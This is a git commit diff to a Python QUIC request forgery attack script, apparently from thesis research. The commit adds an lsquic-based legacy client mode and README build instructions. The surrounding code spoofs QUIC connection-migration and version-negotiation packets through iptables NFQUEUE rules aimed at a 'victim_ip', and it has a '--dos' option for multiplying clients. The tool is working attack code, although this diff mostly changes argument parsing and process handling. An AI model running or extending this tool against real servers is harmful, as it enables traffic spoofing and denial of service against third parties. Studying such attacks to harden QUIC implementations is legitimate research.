6509442d494f2cc90b82cbc4590faa8a62b16212
yurigbur <yuri.gbur@gmx.de>
2022-03-19 14:02:14 -0700

    added legacy support for lsquic

--- README.md
+++ README.md
@@ -16,6 +16,30 @@ A python attack script built on top of aioquic to perform request forgery with Q
 
 If the prerequisites are met the script should run out of the box
 
+### Installation of lsquic for legacy mode
+
+*Tested on Ubuntu20.04*
+- Install dependencies
+	```bash
+	sudo apt update && sudo apt install -y golang libevent-dev
+	```
+- Setup boringssl
+	```bash
+	git clone https://boringssl.googlesource.com/boringssl
+	cd boringssl
+	git checkout a9670a8b476470e6f874fef3554e8059683e1413
+	cmake . &&  make
+	BORINGSSL=$PWD
+	cd ..
+	```
+- Compile lsquic
+	```bash
+	git clone https://github.com/litespeedtech/lsquic.git
+	cd lsquic
+	git submodule update --init --recursive
+	cmake -DBORINGSSL_DIR=$BORINGSSL .
+	make
+	```
 ## Usage
 
 
--- request_forgery.py
+++ request_forgery.py
@@ -47,6 +47,11 @@ SPOOFED_COUNT = 0
 # Iptables Templates
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
 
+# Legacy Lsquic support
+lsquic_client_tmpl = "/home/master/quic/yuri-repos/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/master/quic/masterthesis/experiments/keylog -p {path} -K -o scid_len=20"
+lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
+lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
+
 def parse_arguments():
 
     gen_desc = "QUIC Request Forgery Attack Script"
@@ -71,8 +76,15 @@ def parse_arguments():
     parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
     parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
     parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
+    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
+    parser_cm.add_argument('--alpn','-a', help='(legacy only) The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='')
+    parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
+    parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
+
     parser_cm._optionals.title = 'Optional Arguments'
     parser_cm._positionals.title = 'Required Arguments'
+
+
 
     #Parser for VNRF
     parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
@@ -151,7 +163,6 @@ def server_initial_callback(packet, args=None):
 
 
 def configure_client(args):
-
     if args.path[0] != "/":
         args.path = "/" + args.path
     url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
@@ -168,6 +179,16 @@ def configure_client(args):
     )
     
     return url, configuration
+
+
+def configure_legacy_client(args):
+    cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
+    if args.version and args.version != '1':
+        cmd += lsquic_client_flag_version.format(version=args.version)     
+    if args.alpn and args.alpn != '':
+        cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
+    
+    return cmd
 
 
 def main():
@@ -187,7 +208,6 @@ def main():
     try:
         #Initializing netfilter queue
         q = NetfilterQueue()
-        processes = []
         if args.mode == 'cm':
             args.limit = args.limit * args.dos
             q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
@@ -201,11 +221,17 @@ def main():
             raise NotImplementedError("Mode not implemented")
 
         print("[+] Starting client")
-        url, configuration = configure_client(args)
-        for i in range(1,args.dos+1):
-            p = Process(target=cl.start_client, args=(url, configuration,))
+        processes = []
+        if args.legacy:
+            cmd = configure_legacy_client(args)
+            p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             processes.append(p)
-            p.start()
+        else:
+            url, configuration = configure_client(args)
+            for i in range(1,args.dos+1):
+                p = Process(target=cl.start_client, args=(url, configuration,))
+                processes.append(p)
+                p.start()
         
         print("[+] Hooking into nfqueue")
         q.run()
@@ -218,9 +244,10 @@ def main():
     
     print("\n[+] Cleaning up")     
     print("[-] Terminating Client(s)")
+    
     for p in processes:
         try:
-            p.kill()
+            p.terminate()
         except:
             pass   
     print("[-] Unbinding netfilter queue.")
